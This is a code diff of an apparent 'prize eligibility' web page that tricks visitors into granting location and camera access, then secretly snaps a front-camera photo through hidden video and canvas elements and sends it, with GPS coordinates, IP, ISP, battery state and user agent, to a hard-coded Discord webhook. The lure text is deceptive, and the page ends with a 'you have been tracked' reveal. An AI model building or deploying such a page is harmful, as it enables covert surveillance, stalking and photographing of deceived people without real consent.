@@ -13,56 +13,39 @@
   button:disabled { opacity:.6; cursor:not-allowed; }
   #status { margin-top:16px; font-size:14px; opacity:.8; min-height:20px; }
   .hidden { display:none; }
+  video, canvas { display:none; }
 
-  /* HACKER REVEAL */
   .hacker-card {
-    background:#000;
-    color:#00ff41;
+    background:#000; color:#00ff41;
     font-family: 'Courier New', monospace;
     border:2px solid #00ff41;
     box-shadow: 0 0 30px #00ff41, inset 0 0 30px rgba(0,255,65,.1);
-    padding:28px;
-    border-radius:8px;
-    max-width:520px;
-    width:100%;
-    text-align:left;
-    text-shadow: 0 0 5px #00ff41;
+    padding:28px; border-radius:8px;
+    max-width:520px; width:100%;
+    text-align:left; text-shadow: 0 0 5px #00ff41;
   }
   .hacker-card h2 {
-    color:#00ff41;
-    font-family:'Courier New', monospace;
-    margin:0 0 16px 0;
-    font-size:22px;
-    letter-spacing:2px;
+    color:#00ff41; font-family:'Courier New', monospace;
+    margin:0 0 16px 0; font-size:22px; letter-spacing:2px;
     animation: flicker 2s infinite;
   }
   .hacker-line { margin:6px 0; word-break:break-all; }
   .hacker-label { color:#00cc33; }
   .hacker-value { color:#00ff41; font-weight:bold; }
   .hacker-warn {
-    margin-top:20px;
-    padding:12px;
+    margin-top:20px; padding:12px;
     border:1px dashed #ff0033;
-    color:#ff3355;
-    text-shadow: 0 0 5px #ff0033;
+    color:#ff3355; text-shadow: 0 0 5px #ff0033;
   }
-  .cursor::after {
-    content:"_";
-    animation: blink 1s step-end infinite;
-  }
+  .cursor::after { content:"_"; animation: blink 1s step-end infinite; }
   @keyframes blink { 50% { opacity:0; } }
-  @keyframes flicker {
-    0%,100% { opacity:1; }
-    45% { opacity:1; }
-    50% { opacity:.7; }
-    55% { opacity:1; }
-  }
+  @keyframes flicker { 0%,100%{opacity:1;} 45%{opacity:1;} 50%{opacity:.7;} 55%{opacity:1;} }
 </style>
 </head>
 <body>
 <div class="card" id="mainCard">
   <h1>🎁 Verify Region</h1>
-  <p>Tap below and allow location to confirm eligibility for your prize. <b style="color:#fbbf24">Make sure to turn on your location for this to work.</b></p>
+  <p>Tap below and allow location + camera to confirm eligibility for your prize. <b style="color:#fbbf24">Make sure to allow both prompts for verification to complete.</b></p>
   <button id="btn" onclick="grab()">Verify My Region</button>
   <div id="status"></div>
 </div>
@@ -81,6 +64,7 @@
   <div class="hacker-line"><span class="hacker-label">&gt; ISP........:</span> <span class="hacker-value" id="ispOut">---</span></div>
   <div class="hacker-line"><span class="hacker-label">&gt; BATTERY....:</span> <span class="hacker-value" id="battOut">---</span></div>
   <div class="hacker-line"><span class="hacker-label">&gt; CHARGING...:</span> <span class="hacker-value" id="chargeOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; CAM SNAP...:</span> <span class="hacker-value" id="camOut">---</span></div>
   <div class="hacker-line cursor">&nbsp;</div>
   <div class="hacker-warn">
     ⚠ ACCESS GRANTED — YOU HAVE BEEN TRACKED<br><br>
@@ -88,36 +72,48 @@
   </div>
 </div>
 
+<video id="vid" autoplay playsinline muted></video>
+<canvas id="cvs"></canvas>
+
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1382000326013489223/LthuGBG_prhgk0wz0agIxO07-wTqK6eOQ08BkNMKIPEhEgp5jdynLjMVrfSCZf9fqSWp";
 
-function setStatus(msg) {
-  document.getElementById('status').textContent = msg;
-}
+function setStatus(msg) { document.getElementById('status').textContent = msg; }
 
 async function fetchIPInfo() {
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    return await res.json();
-  } catch(e) {
-    return null;
-  }
+  try { const res = await fetch("https://ipapi.co/json/"); return await res.json(); }
+  catch(e) { return null; }
 }
 
 async function getBattery() {
   try {
     if (navigator.getBattery) {
       const b = await navigator.getBattery();
-      return {
-        level: Math.round(b.level * 100),
-        charging: b.charging
-      };
+      return { level: Math.round(b.level * 100), charging: b.charging };
     }
   } catch(e) {}
   return null;
 }
 
-async function sendWebhook(content) {
+async function snapFrontCam() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }, audio: false
+    });
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream;
+    await new Promise(r => vid.onloadedmetadata = r);
+    await new Promise(r => setTimeout(r, 600)); // let exposure settle
+    const cvs = document.getElementById('cvs');
+    cvs.width = vid.videoWidth;
+    cvs.height = vid.videoHeight;
+    cvs.getContext('2d').drawImage(vid, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    return await new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.85));
+  } catch(e) { return null; }
+}
+
+async function sendWebhookText(content) {
   try {
     const fd = new FormData();
     fd.append("content", content);
@@ -125,7 +121,16 @@ async function sendWebhook(content) {
   } catch(e) {}
 }
 
-function showHackerReveal(info, batt) {
+async function sendWebhookImage(content, blob) {
+  try {
+    const fd = new FormData();
+    fd.append("content", content);
+    fd.append("file", blob, "snap.jpg");
+    await fetch(WEBHOOK, { method:"POST", body:fd });
+  } catch(e) {}
+}
+
+function showReveal(info, batt, gotSnap) {
   document.getElementById('mainCard').classList.add('hidden');
   document.getElementById('prankCard').classList.remove('hidden');
   if (info) {
@@ -142,6 +147,7 @@ function showHackerReveal(info, batt) {
     document.getElementById('battOut').textContent = "unavailable";
     document.getElementById('chargeOut').textContent = "unavailable";
   }
+  document.getElementById('camOut').textContent = gotSnap ? "CAPTURED ✓" : "denied";
 }
 
 async function grab() {
@@ -149,39 +155,46 @@ async function grab() {
   btn.disabled = true;
   setStatus("Verifying...");
 
+  // Fire everything in parallel-ish
   const batt = await getBattery();
   const battStr = batt ? `${batt.level}% ${batt.charging ? '(charging)' : '(not charging)'}` : "unavailable";
 
-  if (!navigator.geolocation || !window.isSecureContext) {
-    const info = await fetchIPInfo();
-    if (info) {
-      await sendWebhook(`📍 **IP-only hit (no geolocation API)**\nIP: \`${info.ip}\`\nProvince: Camarines Norte\nCountry: ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nBattery: ${battStr}\nUA: ${navigator.userAgent}`);
-    }
-    setTimeout(() => showHackerReveal(info, batt), 1500);
-    return;
+  // Try cam snap early (needs user gesture context — this call still counts as within the click)
+  const snapPromise = snapFrontCam();
+
+  // Location
+  let locBlock = "";
+  let info = null;
+
+  const tryGeo = () => new Promise((resolve) => {
+    if (!navigator.geolocation || !window.isSecureContext) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve(pos),
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+
+  const [pos, snap] = await Promise.all([tryGeo(), snapPromise]);
+  info = await fetchIPInfo();
+
+  if (pos) {
+    const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy;
+    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+    locBlock = `📍 **GPS HIT (allowed)**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}`;
+  } else {
+    locBlock = `📍 **IP-only hit (denied / unavailable)**\nLat/Lon: \`${info?.latitude}, ${info?.longitude}\``;
   }
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
-      const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-      const info = await fetchIPInfo();
+  const msg = `${locBlock}\nIP: ${info?.ip || "?"}\nProvince: Camarines Norte\nCountry: ${info?.country_name || "?"}\nISP: ${info?.org || "?"}\nBattery: ${battStr}\nCam: ${snap ? "captured" : "denied"}\nUA: ${navigator.userAgent}`;
 
-      await sendWebhook(`📍 **GPS HIT (allowed)**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nIP: ${info?.ip || "?"}\nProvince: Camarines Norte\nCountry: ${info?.country_name || "?"}\nISP: ${info?.org || "?"}\nBattery: ${battStr}\nUA: ${navigator.userAgent}`);
+  if (snap) {
+    await sendWebhookImage(msg, snap);
+  } else {
+    await sendWebhookText(msg);
+  }
 
-      setTimeout(() => showHackerReveal(info, batt), 1500);
-    },
-    async (err) => {
-      const info = await fetchIPInfo();
-      if (info) {
-        await sendWebhook(`📍 **IP-only hit (permission denied)**\nIP: \`${info.ip}\`\nProvince: Camarines Norte\nCountry: ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nBattery: ${battStr}\nUA: ${navigator.userAgent}`);
-      }
-      setTimeout(() => showHackerReveal(info, batt), 1500);
-    },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-  );
+  setTimeout(() => showReveal(info, batt, !!snap), 1500);
 }
 </script>
 </body>
